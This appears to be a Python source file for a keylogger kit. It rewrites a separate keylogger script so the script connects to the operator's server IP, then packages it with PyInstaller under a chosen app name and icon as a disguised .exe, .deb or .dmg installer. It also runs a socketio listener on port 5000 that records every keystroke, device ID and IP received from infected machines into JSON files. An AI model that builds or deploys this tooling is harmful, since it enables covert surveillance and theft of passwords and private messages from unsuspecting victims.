from rich.console import Console
from rich.panel import Panel
import re
import shutil
import requests
import os
console = Console()


def get_os_type():
    while True:
        os_type = input("1 🖥️  Enter OS type (win/linux/mac): ").strip().lower()
        if os_type == 'x':
            return "exit"
        if os_type in ['win', 'linux', 'mac']:
            return os_type
        else:
            console.print("[bold red]❌ Invalid OS type. Please enter 'win', 'linux', or 'mac'.[/bold red]")

def get_server_ip():
    while True:
        ip = input("2 🌐 Enter server IP address (e.g. 192.168.1.1): ").strip()
        if ip.lower() == 'x':
            return "exit"
        # Basic IP format validation
        if re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
            return ip
        else:
            console.print("[bold red]❌ Invalid IP address. Please enter a valid IPv4 address.[/bold red]")

def get_app_name():
    while True:
        name = input("3 🏷️  Enter your desired app name: ").strip()
        if name.lower() == 'x':
            return "exit"
        if len(name) >= 2:
            return name
        else:
            console.print("[bold red]❌ Name too short. Please enter a valid name.[/bold red]")

def get_icon_url():
    while True:
        url = input("🖼️  Enter icon image URL: ").strip()
        if url.lower() == 'x':
            return "exit"
        if url.startswith("http://") or url.startswith("https://"):
            return url
        else:
            console.print("[bold red]❌ Invalid URL. Please start with http:// or https://[/bold red]")


def input_instructions():
    console.print(Panel.fit(
        "[bold yellow]Instructions[/bold yellow]\n\n"
        "🖥️  [bold]Step 1:[/bold] Choose OS type → [green]win[/green], [green]linux[/green], or [green]mac[/green]\n"
        "🌐 [bold]Step 2:[/bold] Enter server IP address (e.g. 192.168.1.1)\n"
        "🏷️  [bold]Step 3:[/bold] Enter your desired app name (e.g. MyApp)\n"
        "🖼️  [bold]Step 4:[/bold] Enter icon image URL (e.g. https://example.com/icon.png)\n"
        "⚠️  [bold]Warning:[/bold] Windows use .ico (e.g. logo.ico) for other OS use .png (e.g. logo.png)\n\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        border_style="magenta"
    ))

def user_option():
    console.print(Panel.fit(
        "[bold cyan]Keylogger Options[/bold cyan]\n\n"
        "1️⃣  Create a new keylogger\n"
        "2️⃣  Start listening for an existing keylogger\n\n"
        "❌ Enter [red]'x'[/red] to exit anytime",
        border_style="magenta"
    ))
    while True:
        option = console.input("[bold green]👉 Enter your option:[/bold green] ").strip().lower()
        if option in ['1', '2', 'x']:
            return option
        else:
            console.print("[bold red]Invalid option. Please enter 1, 2, or 'x' to exit.[/bold red]")



def banner():
    console.print(Panel.fit(
        "⌨️ [bold green] keylogger[/bold green]",
        border_style="red"
    ))


def getio():
    banner()
    input_instructions()
    os_type = get_os_type()
    if os_type == "exit":
        return None

    ip_address = get_server_ip()
    if ip_address == "exit":
        return None

    app_name = get_app_name()
    if app_name == "exit":
        return None

    icon_url = get_icon_url()
    if icon_url == "exit":
        return None

    return os_type, ip_address, app_name, icon_url




def download_icon(icon_url, app_name):
    ext = '.ico' if icon_url.endswith('.ico') else '.png'
    local_path = f'{app_name}_icon{ext}'
    try:
        response = requests.get(icon_url, stream=True)
        if response.status_code == 200:
            with open(local_path, 'wb') as f:
                for chunk in response.iter_content(1024):
                    f.write(chunk)
            return local_path
        else:
            console.print(f"[red]❌ Failed to download icon. Status code: {response.status_code}[/red]")
            return None
    except Exception as e:
        console.print(f"[red]❌ Error downloading icon: {e}[/red]")
        return None

def compile_app(os_type, ip_address, app_name, icon_url):
    # 1. Inject app name into code.py
    code_path = 'keylogger/keylogger.py'
    with open(code_path, 'r') as f:
        lines = f.readlines()
    
    for i in range(len(lines)):
        if "sio.connect(" in lines[i]:
            lines[i] = re.sub(
                r'sio\.connect\("http://.*?:5000"\)', 
                f'sio.connect("http://{ip_address}:5000")', 
                lines[i]
            )
    with open(code_path, 'w') as f:
        f.writelines(lines)
    print(code_path,ip_address,lines)
    # 2. Download icon file from URL
    icon_path = download_icon(icon_url, app_name)
    if not icon_path:
        return
    input()
    # 3. Build with PyInstaller
    build_dir = 'keylogger/build'
    os.makedirs(build_dir, exist_ok=True)

    # 1. Build executable
    build_cmd = f'pyinstaller --onefile --name "{app_name}" "{code_path}"'

    if os_type == 'win' and icon_path.endswith('.ico'):
        build_cmd += f' --icon="{icon_path}"'
    elif os_type in ['linux', 'mac'] and icon_path.endswith('.png'):
        build_cmd += f' --icon="{icon_path}"'

    build_cmd += f' --distpath={build_dir}'

    console.print("\n🔧 [yellow]Building the executable with PyInstaller...[/yellow]")
    os.system(build_cmd)

    # 2. Define paths
    output_file = f'{build_dir}/{app_name}'
    installer_output = f'{build_dir}/{app_name}_installer'

    # 3. OS-specific packaging
    if os_type == 'win':
        console.print(f"✅ [green]EXE created:[/green] {output_file}.exe")

    elif os_type == 'linux':
        console.print("📦 [cyan]Packaging into .deb...[/cyan]")
        os.makedirs(f'{installer_output}/DEBIAN', exist_ok=True)
        os.makedirs(f'{installer_output}/usr/local/bin', exist_ok=True)

        control_content = f"""Package: {app_name}
    Version: 1.0
    Section: base
    Priority: optional
    Architecture: all
    Maintainer: karthithehacker
    Description: a tool to learn cyber security
    """
        with open(f'{installer_output}/DEBIAN/control', 'w') as f:
            f.write(control_content)

        shutil.copy(f'{output_file}', f'{installer_output}/usr/local/bin/{app_name}')
        os.system(f'dpkg-deb --build {installer_output}')
        shutil.move(f'{installer_output}.deb', f'{build_dir}/{app_name}.deb')
        console.print(f"✅ [green].deb file created:[/green] {build_dir}/{app_name}.deb")

    elif os_type == 'mac':
        console.print("🍏 [cyan]Creating .dmg (macOS)...[/cyan]")
        shutil.move(f'{output_file}', f'{build_dir}/{app_name}')
        os.system(f'create-dmg {build_dir}/{app_name}.dmg {build_dir}/{app_name}')
        console.print(f"✅ [green].dmg created:[/green] {build_dir}/{app_name}.dmg")

        
    else:
        console.print("❌ [red]Unknown OS type specified.[/red]")


def start_keylogger_server():
    import socketio
    import eventlet
    import datetime
    import json
    from rich.table import Table


    sio = socketio.Server()
    app = socketio.WSGIApp(sio)
    clients = {}

    # Create folders
    base_dir = os.path.join(os.getcwd(), "keylogger")
    devices_dir = os.path.join(base_dir, "devices")
    os.makedirs(devices_dir, exist_ok=True)

    # Initialize master JSON file
    master_file = os.path.join(base_dir, "keylogger.json")
    if not os.path.exists(master_file):
        with open(master_file, "w") as f:
            json.dump({
                "devices": [],
                "total_connected": 0,
                "last_connected_device": None
            }, f, indent=4)

    def load_master():
        with open(master_file, "r") as f:
            return json.load(f)

    def save_master(data):
        with open(master_file, "w") as f:
            json.dump(data, f, indent=4)

    @sio.event
    def connect(sid, environ):
        ip = environ['REMOTE_ADDR']
        clients[sid] = {
            "connected_at": datetime.datetime.now(),
            "ip": ip
        }

    @sio.event
    def disconnect(sid):
        clients.pop(sid, None)

    @sio.event
    def keypress(sid, data):
        device_id = data.get("device_id", "unknown")
        key = data.get("key", "?")
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip = clients.get(sid, {}).get("ip", "unknown")

        # Print keylog info
        table = Table.grid()
        table.add_column(justify="left")
        table.add_column(justify="left")
        table.add_row("[bold cyan]🕒 Time:[/bold cyan]", f"{timestamp}")
        table.add_row("[bold green]💻 Device ID:[/bold green]", f"{device_id}")
        table.add_row("[bold magenta]🔑 Key Pressed:[/bold magenta]", f"{key}")
        table.add_row("[bold yellow]🌐 IP Address:[/bold yellow]", f"{ip}")
        console.print(Panel(table, title="📥 Keylog Received", border_style="green"))

        # Save to master
        master = load_master()
        if device_id not in master["devices"]:
            master["devices"].append(device_id)
            master["total_connected"] += 1
        master["last_connected_device"] = device_id
        save_master(master)

        # Save to device log file
        device_file = os.path.join(devices_dir, f"{device_id}.json")
        log_entry = {
            "timestamp": timestamp,
            "ip": ip,
            "key": key
        }

        if os.path.exists(device_file):
            with open(device_file, "r") as f:
                device_logs = json.load(f)
        else:
            device_logs = []

        device_logs.append(log_entry)

        with open(device_file, "w") as f:
            json.dump(device_logs, f, indent=4)

    # Display listener menu at top
    console.print(Panel.fit(
        "[bold green]🎧 Keylogger Listener Started[/bold green]\n"
        "[bold red]❌ Press Ctrl+C to stop the server[/bold red]",
        title="🟢 Server Status",
        border_style="bright_blue"
    ))

    # Start the server
    eventlet.wsgi.server(eventlet.listen(('0.0.0.0', 5000)), app)
